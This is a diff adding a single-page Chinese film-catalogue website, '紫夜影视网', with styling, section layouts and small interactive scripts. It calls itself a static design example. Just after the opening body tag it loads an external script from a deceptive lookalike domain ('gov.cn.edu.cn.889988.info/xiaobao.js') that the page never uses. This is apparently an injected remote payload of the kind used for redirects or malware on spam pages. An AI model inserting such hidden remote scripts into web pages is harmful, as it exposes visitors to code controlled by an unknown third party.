@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="紫夜影视网（ziyeyingshiwang-cn）是影视内容展示与分类浏览网站，官方网址为 https://ziyeyingshiwang-cn.github.io，提供紫夜影院、主题片单、影视分类、影迷资讯和网站说明栏目。">
+<meta name="keywords" content="紫夜影视网, ziyeyingshiwang-cn, 紫夜影视网官网, 紫夜影院, 影视分类, 影视资讯">
+<meta name="robots" content="index, follow">
+<title>紫夜影视网｜ziyeyingshiwang-cn｜影视内容展示与分类浏览</title>
+<style>
+:root{
+  --purple:#7156d8;
+  --plum:#4a2c8a;
+  --pink:#e6649b;
+  --violet:#a97bff;
+  --ink:#f1edff;
+  --ink2:#b4a9d8;
+  --line:#39275e;
+  --bg:#0b0718;
+  --panel:#150d2b;
+  --radius:20px;
+}
+*{box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  margin:0;
+  background:
+    radial-gradient(circle at 90% 5%,#42237a 0,transparent 27%),
+    radial-gradient(circle at 8% 28%,#781750 0,transparent 25%),
+    var(--bg);
+  color:var(--ink);
+  font-family:"Microsoft YaHei","PingFang SC","WenQuanYi Micro Hei",Arial,sans-serif;
+  line-height:1.75;
+  -webkit-text-size-adjust:100%;
+}
+img{max-width:100%;display:block;}
+a{color:inherit;text-decoration:none;}
+a:focus-visible,button:focus-visible,input:focus-visible,textarea:focus-visible,select:focus-visible{outline:3px solid var(--violet);outline-offset:3px;}
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px;}
+.section-inner{max-width:1200px;margin:0 auto;padding:72px 22px;}
+.eyebrow{font-size:12px;font-weight:800;letter-spacing:.22em;color:var(--violet);text-transform:uppercase;}
+.sec-title{font-size:clamp(29px,4.3vw,45px);line-height:1.25;margin:12px 0 0;}
+.sec-desc{color:var(--ink2);margin:12px 0 0;max-width:680px;}
+/* 顶栏 */
+.topbar{position:sticky;top:0;z-index:70;background:rgba(11,7,24,.88);backdrop-filter:blur(14px);border-bottom:1px solid var(--line);}
+.topbar .wrap{display:flex;align-items:center;gap:18px;height:68px;}
+.logo{display:flex;align-items:center;gap:11px;font-size:20px;font-weight:900;letter-spacing:.04em;}
+.logomark{width:34px;height:34px;border-radius:11px;background:linear-gradient(135deg,var(--violet),var(--pink));position:relative;transform:rotate(45deg);}
+.logomark:before{content:"";position:absolute;inset:8px;border-radius:50%;background:var(--bg);}
+.navlinks{display:flex;gap:5px;margin-left:auto;flex-wrap:wrap;}
+.navlinks a{padding:9px 14px;border-radius:99px;font-size:14px;font-weight:700;color:var(--ink2);}
+.navlinks a:hover{color:var(--ink);background:rgba(169,123,255,.12);}
+.domain{font-size:13px;color:var(--ink2);border-left:1px solid var(--line);padding-left:15px;}
+.menubtn{display:none;margin-left:auto;border:1px solid var(--line);background:transparent;color:var(--violet);padding:9px 14px;border-radius:11px;font-weight:800;cursor:pointer;}
+@media(max-width:880px){
+  .menubtn{display:block;}
+  .navlinks{position:fixed;inset:68px 0 auto;flex-direction:column;background:var(--panel);padding:18px;border-top:1px solid var(--line);transform:translateY(-150%);transition:.35s ease;box-shadow:0 22px 45px rgba(0,0,0,.55);}
+  .navlinks.show{transform:none;}
+  .navlinks a{border-radius:12px;padding:14px;}
+  .domain{display:none;}
+}
+/* 首屏：横向滑动星空场景 */
+.hero{padding:52px 0 22px;overflow:hidden;}
+.herotext{max-width:1200px;margin:0 auto 32px;padding:0 22px;}
+.herotext h1{font-size:clamp(38px,6.6vw,72px);line-height:1.12;margin:12px 0 18px;font-weight:950;}
+.herotext h1 em{font-style:normal;background:linear-gradient(95deg,var(--violet),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent;}
+.herotext p{max-width:650px;font-size:17px;color:var(--ink2);margin:0 0 26px;}
+.hero-actions{display:flex;gap:12px;flex-wrap:wrap;}
+.btn{border:0;border-radius:99px;padding:14px 26px;font-size:15px;font-weight:800;cursor:pointer;}
+.btn-purple{background:linear-gradient(95deg,var(--purple),var(--pink));color:#fff;box-shadow:0 10px 25px rgba(113,86,216,.32);}
+.btn-outline{background:transparent;color:var(--ink);border:1px solid var(--line);}
+.scenes{display:flex;gap:18px;overflow-x:auto;padding:18px 22px 38px;scroll-snap-type:x mandatory;}
+.scenes::-webkit-scrollbar{height:8px;}
+.scenes::-webkit-scrollbar-thumb{background:var(--line);border-radius:99px;}
+.scene{flex:0 0 clamp(255px,64vw,360px);scroll-snap-align:start;height:250px;border-radius:26px;padding:24px;display:flex;flex-direction:column;justify-content:flex-end;background:linear-gradient(160deg,rgba(255,255,255,.12),rgba(255,255,255,0)),linear-gradient(160deg,#26174a,#130a28);border:1px solid var(--line);box-shadow:0 20px 45px rgba(0,0,0,.45);}
+.scene b{font-size:20px;margin-bottom:7px;}
+.scene p{margin:0;color:#ded5f5;font-size:14px;}
+/* 栏目一：紫夜影院——幻灯片封面墙 */
+#theater{border-top:1px solid var(--line);background:linear-gradient(180deg,#110821,#160c2d);}
+.showcase{display:grid;grid-template-columns:1.45fr .85fr;gap:26px;align-items:stretch;}
+.viewer{border-radius:28px;padding:34px;background:linear-gradient(145deg,#35205e,#160c2d);border:1px solid var(--line);min-height:410px;display:flex;flex-direction:column;justify-content:flex-end;position:relative;overflow:hidden;}
+.viewer:before{content:"";position:absolute;width:320px;height:320px;border-radius:50%;background:rgba(230,100,155,.28);right:-110px;top:-120px;filter:blur(8px);}
+.viewer small{position:relative;color:var(--violet);font-weight:800;letter-spacing:.16em;}
+.viewer h3{position:relative;font-size:31px;margin:13px 0 11px;}
+.viewer p{position:relative;color:#e4ddf7;margin:0;}
+.filmstrip{display:grid;gap:16px;align-content:start;}
+.frame{border-radius:17px;padding:20px;background:var(--panel);border:1px solid var(--line);cursor:pointer;transition:.25s;}
+.frame.active{background:linear-gradient(95deg,var(--plum),#281149);border-color:var(--pink);}
+.frame b{display:block;font-size:16px;}
+.frame span{font-size:13px;color:var(--ink2);}
+@media(max-width:900px){.showcase{grid-template-columns:1fr;}.viewer{min-height:330px;}}
+/* 栏目二：主题片单——转盘分类 */
+#playlist{background:#0e081d;}
+.wheelblock{display:grid;grid-template-columns:330px 1fr;gap:34px;align-items:center;}
+.wheel{aspect-ratio:1/1;border-radius:50%;border:1px solid var(--line);background:conic-gradient(from 0deg,var(--plum),var(--purple),var(--pink),#672a86,var(--plum));position:relative;margin:auto;width:100%;max-width:330px;}
+.wheel:after{content:"";position:absolute;inset:22%;border-radius:50%;background:var(--bg);border:1px solid var(--line);}
+.wheel b{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;text-align:center;font-size:17px;color:#fff;z-index:2;}
+.labels{display:grid;grid-template-columns:repeat(2,1fr);gap:15px;}
+.label{border-radius:15px;padding:20px;background:var(--panel);border:1px solid var(--line);min-height:120px;display:flex;flex-direction:column;justify-content:flex-end;}
+.label b{font-size:18px;}
+.label small{color:var(--ink2);}
+@media(max-width:900px){.wheelblock{grid-template-columns:1fr;}.labels{grid-template-columns:1fr;}}
+/* 栏目三：影视分类——筛选表 */
+#category{border-top:1px solid var(--line);background:linear-gradient(180deg,#150c2d,#0d071a);}
+.filters{display:grid;grid-template-columns:220px 1fr;gap:28px;}
+.dropdown{display:grid;gap:14px;}
+.selectbox{border:1px solid var(--line);border-radius:14px;padding:17px;background:var(--panel);width:100%;color:var(--ink);font-family:inherit;font-weight:800;}
+.tablewrap{overflow-x:auto;border:1px solid var(--line);border-radius:18px;background:var(--panel);}
+table{width:100%;border-collapse:collapse;min-width:560px;}
+th,td{padding:17px 18px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top;}
+th{color:var(--violet);font-size:13px;letter-spacing:.12em;}
+td b{font-size:16px;}
+.tag{display:inline-block;padding:5px 10px;border-radius:99px;background:rgba(169,123,255,.14);color:#e3d9ff;font-size:12px;font-weight:800;}
+@media(max-width:880px){.filters{grid-template-columns:1fr;}}
+/* 栏目四：影迷资讯——横向展开卡片 */
+#news{background:#0e081d;}
+.newslist{display:grid;gap:18px;}
+.excard{display:grid;grid-template-columns:130px 1fr auto;gap:22px;align-items:center;border-radius:20px;padding:22px;border:1px solid var(--line);background:linear-gradient(100deg,#1b1038,#100821);}
+.excard:nth-child(even){background:linear-gradient(100deg,#241241,#120a26);}
+.excard time{font-size:13px;font-weight:800;color:var(--pink);}
+.excard h3{margin:0 0 8px;font-size:20px;}
+.excard p{margin:0;color:var(--ink2);font-size:14px;}
+.excard a{align-self:center;white-space:nowrap;font-weight:800;color:var(--violet);}
+@media(max-width:820px){.excard{grid-template-columns:1fr;}.excard a{justify-self:start;}}
+/* 栏目五：网站说明——步骤向导 */
+#about{border-top:1px solid var(--line);background:#0b0718;}
+.stepper{display:grid;grid-template-columns:repeat(4,1fr);gap:18px;}
+.step{border-radius:20px;padding:25px;background:var(--panel);border:1px solid var(--line);position:relative;}
+.step:after{content:"";position:absolute;top:28px;right:-10px;width:20px;height:2px;background:var(--line);}
+.step:last-child:after{display:none;}
+.step b{display:block;font-size:13px;color:var(--pink);font-weight:800;margin-bottom:8px;}
+.step h3{font-size:19px;margin:0 0 8px;}
+.step p{margin:0;color:var(--ink2);font-size:14px;}
+@media(max-width:900px){.stepper{grid-template-columns:repeat(2,1fr);}.step:after{display:none;}}
+@media(max-width:480px){.stepper{grid-template-columns:1fr;}}
+/* 页脚 */
+footer{border-top:1px solid var(--line);background:#070410;padding:50px 0 25px;}
+.footgrid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:28px;}
+footer h4{color:var(--violet);margin:0 0 15px;}
+footer ul{margin:0;padding:0;list-style:none;display:grid;gap:10px;color:var(--ink2);}
+footer a:hover{color:var(--pink);}
+.copy{margin-top:32px;padding-top:20px;border-top:1px solid var(--line);color:#8374aa;font-size:13px;display:flex;justify-content:space-between;gap:15px;flex-wrap:wrap;}
+@media print{.scenes{overflow:visible;}.menubtn{display:none;}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+<header class="topbar" role="banner">
+  <div class="wrap">
+    <a class="logo" href="#top" aria-label="紫夜影视网返回首页">
+      <span class="logomark" aria-hidden="true"></span>
+      <span>紫夜影视网</span>
+    </a>
+    <button class="menubtn" aria-controls="mainnav" aria-expanded="false" onclick="document.getElementById('mainnav').classList.toggle('show');">导航</button>
+    <nav id="mainnav" class="navlinks" aria-label="主导航">
+      <a href="#theater">紫夜影院</a>
+      <a href="#playlist">主题片单</a>
+      <a href="#category">影视分类</a>
+      <a href="#news">影迷资讯</a>
+      <a href="#about">网站说明</a>
+      <span class="domain">https://ziyeyingshiwang-cn.github.io</span>
+    </nav>
+  </div>
+</header>
+
+<main id="top">
+  <section class="hero" aria-labelledby="hero-title">
+    <div class="herotext">
+      <div class="eyebrow">网站名称：紫夜影视网 · 网站网址：https://ziyeyingshiwang-cn.github.io</div>
+      <h1 id="hero-title">紫夜影视网<br><em>ziyeyingshiwang-cn</em></h1>
+      <p>紫夜影视网（ziyeyingshiwang-cn）是影视内容展示与分类浏览网站。页面采用单页锚点导航，方便访问者在手机、平板和电脑上浏览影视条目简介、主题片单与网站资讯。</p>
+      <div class="hero-actions">
+        <a class="btn btn-purple" href="#theater">进入紫夜影院</a>
+        <a class="btn btn-outline" href="#category">查看影视分类</a>
+      </div>
+    </div>
+    <div class="scenes" role="list" aria-label="紫夜影视网浏览场景">
+      <article class="scene" role="listitem"><b>紫夜影院</b><p>查看影视内容展示与条目简介。</p></article>
+      <article class="scene" role="listitem"><b>主题片单</b><p>按主题浏览内容，快速筛选展示条目。</p></article>
+      <article class="scene" role="listitem"><b>影视分类</b><p>查看分类标签与内容组织方式。</p></article>
+      <article class="scene" role="listitem"><b>影迷资讯</b><p>阅读网站动态与内容展示说明。</p></article>
+      <article class="scene" role="listitem"><b>官方网址</b><p>https://ziyeyingshiwang-cn.github.io</p></article>
+    </div>
+  </section>
+
+  <section id="theater" class="section-inner" aria-labelledby="theater-title">
+    <header>
+      <div class="eyebrow">栏目一 · 紫夜影院</div>
+      <h2 id="theater-title" class="sec-title">紫夜影院：封面墙幻灯片</h2>
+      <p class="sec-desc">左侧为大封面内容展示区，右侧为缩略条目墙。点击右侧条目即可切换左侧内容，采用动态内容切换结构，区别于普通卡片列表。</p>
+    </header>
+    <div class="showcase">
+      <article class="viewer" id="viewer" itemscope itemtype="https://schema.org/CreativeWork">
+        <small itemprop="genre">内容展示</small>
+        <h3 itemprop="name">紫夜影视网：影视条目导览</h3>
+        <p itemprop="description">展示影视条目简介、分类主题与浏览标签。以下内容仅为页面设计示例，不提供真实影视播放资源。</p>
+      </article>
+      <div class="filmstrip" role="tablist" aria-label="紫夜影院内容">
+        <div class="frame active" role="tab" aria-selected="true" tabindex="0" onclick="showFilm(this,'紫夜影视网：影视条目导览','展示影视条目简介、分类主题与浏览标签。以下内容仅为页面设计示例，不提供真实影视播放资源。','内容展示')"><b>影视条目导览</b><span>简介 · 分类 · 标签</span></div>
+        <div class="frame" role="tab" aria-selected="false" tabindex="0" onclick="showFilm(this,'剧情影像展示','整理剧情主题内容，提供条目简介与分类信息。','剧情展示')"><b>剧情影像展示</b><span>简介 · 剧情 · 分类</span></div>
+        <div class="frame" role="tab" aria-selected="false" tabindex="0" onclick="showFilm(this,'奇幻影像展示','整理奇幻主题内容，提供条目简介与分类信息。','奇幻展示')"><b>奇幻影像展示</b><span>简介 · 奇幻 · 分类</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="playlist" class="section-inner" aria-labelledby="playlist-title">
+    <header>
+      <div class="eyebrow">栏目二 · 主题片单</div>
+      <h2 id="playlist-title" class="sec-title">主题片单：色轮分类导航</h2>
+      <p class="sec-desc">使用圆形色轮作为视觉入口，搭配四组主题信息块。该栏目以图形化导航为中心，结构与传统的文章列表不同。</p>
+    </header>
+    <div class="wheelblock">
+      <div class="wheel" role="img" aria-label="紫夜影视网主题分类色轮"><b>紫夜<br>影视网</b></div>
+      <div class="labels">
+        <article class="label" itemscope itemtype="https://schema.org/ItemList"><b itemprop="name">剧情主题</b><small itemprop="description">展示剧情类条目与简介标签。</small></article>
+        <article class="label" itemscope itemtype="https://schema.org/ItemList"><b itemprop="name">奇幻主题</b><small itemprop="description">展示奇幻类条目与简介标签。</small></article>
+        <article class="label" itemscope itemtype="https://schema.org/ItemList"><b itemprop="name">悬疑主题</b><small itemprop="description">展示悬疑类条目与简介标签。</small></article>
+        <article class="label" itemscope itemtype="https://schema.org/ItemList"><b itemprop="name">动画主题</b><small itemprop="description">展示动画类条目与简介标签。</small></article>
+      </div>
+    </div>
+  </section>
+
+  <section id="category" class="section-inner" aria-labelledby="category-title">
+    <header>
+      <div class="eyebrow">栏目三 · 影视分类</div>
+      <h2 id="category-title" class="sec-title">影视分类：筛选数据表</h2>
+      <p class="sec-desc">采用下拉筛选控件与可横向滚动的信息表，将分类、主题、标签与展示形式组织成结构化列表，方便快速浏览。</p>
+    </header>
+    <div class="filters">
+      <div class="dropdown">
+        <label for="typefilter" class="eyebrow">筛选：内容分类</label>
+        <select id="typefilter" class="selectbox" onchange="filterRows(this.value)">
+          <option value="all">全部分类</option>
+          <option value="剧情">剧情</option>
+          <option value="奇幻">奇幻</option>
+          <option value="悬疑">悬疑</option>
+        </select>
+      </div>
+      <div class="tablewrap">
+        <table itemscope itemtype="https://schema.org/ItemList">
+          <thead><tr><th>展示条目</th><th>内容分类</th><th>主题标签</th><th>展示形式</th></tr></thead>
+          <tbody>
+            <tr class="catrow" data-category="剧情"><td><b itemprop="name">剧情影像导览</b></td><td>剧情</td><td><span class="tag">人物</span></td><td>条目简介</td></tr>
+            <tr class="catrow" data-category="奇幻"><td><b itemprop="name">奇幻影像导览</b></td><td>奇幻</td><td><span class="tag">想象</span></td><td>条目简介</td></tr>
+            <tr class="catrow" data-category="悬疑"><td><b itemprop="name">悬疑影像导览</b></td><td>悬疑</td><td><span class="tag">推理</span></td><td>条目简介</td></tr>
+            <tr class="catrow" data-category="剧情"><td><b itemprop="name">家庭影像导览</b></td><td>剧情</td><td><span class="tag">生活</span></td><td>条目简介</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <section id="news" class="section-inner" aria-labelledby="news-title">
+    <header>
+      <div class="eyebrow">栏目四 · 影迷资讯</div>
+      <h2 id="news-title" class="sec-title">影迷资讯：横向展开条目</h2>
+      <p class="sec-desc">资讯区采用“日期—内容—操作”三栏结构，点击阅读入口展开完整信息，区别于普通瀑布流文章列表。</p>
+    </header>
+    <div class="newslist">
+      <article class="excard" itemscope itemtype="https://schema.org/Article">
+        <time datetime="2026-10-20" itemprop="datePublished">2026.10.20</time>
+        <div><h3 itemprop="headline">紫夜影视网上线单页内容展示网站</h3><p itemprop="description">以紫夜影视网、ziyeyingshiwang-cn 为核心关键词，提供影视分类、主题片单与网站资讯。</p></div>
+        <a href="#news" onclick="toggleInfo(this);return false;">阅读内容</a>
+        <div hidden style="grid-column:1/-1;color:#b4a9d8;font-size:14px;">本页展示影视内容分类与条目简介，不提供真实影视播放资源。官方网址为 https://ziyeyingshiwang-cn.github.io。</div>
+      </article>
+      <article class="excard" itemscope itemtype="https://schema.org/Article">
+        <time datetime="2026-10-11" itemprop="datePublished">2026.10.11</time>
+        <div><h3 itemprop="headline">移动端自适应布局上线</h3><p itemprop="description">页面调整了封面墙、色轮导航与数据表布局，适配不同尺寸的设备屏幕。</p></div>
+        <a href="#news" onclick="toggleInfo(this);return false;">阅读内容</a>
+        <div hidden style="grid-column:1/-1;color:#b4a9d8;font-size:14px;">导航、表格与展开资讯均适配触控操作；在较小屏幕上，表格支持横向滑动浏览。</div>
+      </article>
+      <article class="excard" itemscope itemtype="https://schema.org/Article">
+        <time datetime="2026-09-28" itemprop="datePublished">2026.09.28</time>
+        <div><h3 itemprop="headline">网站名称与网址说明</h3><p itemprop="description">网站名称为紫夜影视网，域名为 ziyeyingshiwang-cn，完整访问地址见下方。</p></div>
+        <a href="#news" onclick="toggleInfo(this);return false;">阅读内容</a>
+        <div hidden style="grid-column:1/-1;color:#b4a9d8;font-size:14px;">完整网址：https://ziyeyingshiwang-cn.github.io。本页不生成 robots.txt 或 sitemap.xml。</div>
+      </article>
+    </div>
+  </section>
+
+  <section id="about" class="section-inner" aria-labelledby="about-title">
+    <header>
+      <div class="eyebrow">栏目五 · 网站说明</div>
+      <h2 id="about-title" class="sec-title">紫夜影视网：网站说明</h2>
+      <p class="sec-desc">通过四步向导介绍网站名称、网址、栏目结构与使用方式，帮助访问者快速理解本页用途。</p>
+    </header>
+    <div class="stepper">
+      <div class="step"><b>步骤 01</b><h3>网站名称</h3><p>紫夜影视网，页面突出展示网站名称与核心关键词。</p></div>
+      <div class="step"><b>步骤 02</b><h3>网站网址</h3><p>官方网址为 https://ziyeyingshiwang-cn.github.io。</p></div>
+      <div class="step"><b>步骤 03</b><h3>栏目结构</h3><p>包含紫夜影院、主题片单、影视分类、影迷资讯与网站说明。</p></div>
+      <div class="step"><b>步骤 04</b><h3>内容说明</h3><p>静态内容展示网站，不提供真实影视播放资源。</p></div>
+    </div>
+  </section>
+</main>
+
+<footer role="contentinfo">
+  <div class="wrap">
+    <div class="footgrid">
+      <div>
+        <div class="logo"><span class="logomark" aria-hidden="true"></span><span>紫夜影视网</span></div>
+        <p style="margin:12px 0 0;max-width:330px;color:#b4a9d8;">紫夜影视网（ziyeyingshiwang-cn）提供影视内容展示与分类浏览，官方网址为 https://ziyeyingshiwang-cn.github.io。</p>
+      </div>
+      <div>
+        <h4>内容栏目</h4>
+        <ul>
+          <li><a href="#theater">紫夜影院</a></li>
+          <li><a href="#playlist">主题片单</a></li>
+          <li><a href="#category">影视分类</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>网站信息</h4>
+        <ul>
+          <li><a href="#news">影迷资讯</a></li>
+          <li><a href="#about">网站说明</a></li>
+          <li><a href="#top">返回顶部</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <span>© <span id="year"></span> 紫夜影视网 · ziyeyingshiwang-cn · https://ziyeyingshiwang-cn.github.io</span>
+      <span>静态网页设计示例</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('year').textContent=new Date().getFullYear();
+document.querySelectorAll('.navlinks a').forEach(function(link){
+  link.addEventListener('click',function(){document.getElementById('mainnav').classList.remove('show');});
+});
+function showFilm(el,title,desc,genre){
+  document.querySelectorAll('.frame').forEach(function(f){f.classList.remove('active');f.setAttribute('aria-selected','false');});
+  el.classList.add('active');el.setAttribute('aria-selected','true');
+  var v=document.getElementById('viewer');
+  v.querySelector('small').textContent=genre;
+  v.querySelector('h3').textContent=title;
+  v.querySelector('p').textContent=desc;
+}
+function filterRows(value){
+  document.querySelectorAll('.catrow').forEach(function(row){
+    row.hidden=(value!=='all'&&row.getAttribute('data-category')!==value);
+  });
+}
+function toggleInfo(btn){
+  var info=btn.parentElement.querySelector('div[hidden],div:not([hidden])');
+  if(!info||info===btn.parentElement.children[1]){return;}
+  var willShow=info.hasAttribute('hidden');
+  if(willShow){info.removeAttribute('hidden');btn.textContent='收起内容';}else{info.setAttribute('hidden','');btn.textContent='阅读内容';}
+}
+</script>
+</body>
+</html>
